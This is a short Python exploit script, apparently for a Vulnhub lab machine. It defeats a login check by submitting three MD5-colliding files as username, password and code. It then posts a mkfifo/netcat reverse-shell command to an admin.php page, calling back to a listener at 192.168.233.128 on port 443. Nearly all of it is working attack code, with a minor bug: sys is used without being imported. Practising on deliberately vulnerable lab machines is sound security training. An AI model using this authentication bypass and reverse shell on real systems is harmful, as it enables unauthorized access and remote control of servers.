# Vulnhub

#!/usr/bin/python3

import requests
import urllib.parse

session = requests.session()

target_url = "http://192.168.233.167:80/d5fa314e8577e3a7b8534a014b4dcb221de823ad/"
cookies = {"PHPSESSID": "adjo8rtss4dhlinl0dpu4nst52"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.233.167", "Connection": "close", "Referer": "http://192.168.233.167/d5fa314e8577e3a7b8534a014b4dcb221de823ad/", "Upgrade-Insecure-Requests": "1"}

def md5_collisions():
    try:    
        with open("f1", "rb") as f1, open("f2", "rb") as f2, open("f3", "rb") as f3:
            try:
                return (urllib.parse.quote(f1.read()), urllib.parse.quote(f2.read()), urllib.parse.quote(f3.read()))
            except:
                print("[-] Cannot encode collisions files")
                sys.exit()
    except:
        print("[-] Cannot find md5 collisions files: f1, f2, f3")
        sys.exit()

username, password, code = md5_collisions()
proxy = {
    'http': 'http://127.0.0.1:8080',  # Puerto donde escucha Burp Suite
    'https': 'http://127.0.0.1:8080'
}

data = "username={}&password={}&code={}&login=Login".format( username, password, code)

p = session.post(target_url, headers=headers, cookies=cookies, data=data)

command_url = "http://192.168.233.167:80/d5fa314e8577e3a7b8534a014b4dcb221de823ad/admin.php"
rev_shell_command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.233.128 443 >/tmp/f"
data2 = {
	'command': rev_shell_command,
	'submit': 'Submit+Query'
}

p2 = session.post(command_url, headers=headers, cookies=cookies, data=data2)
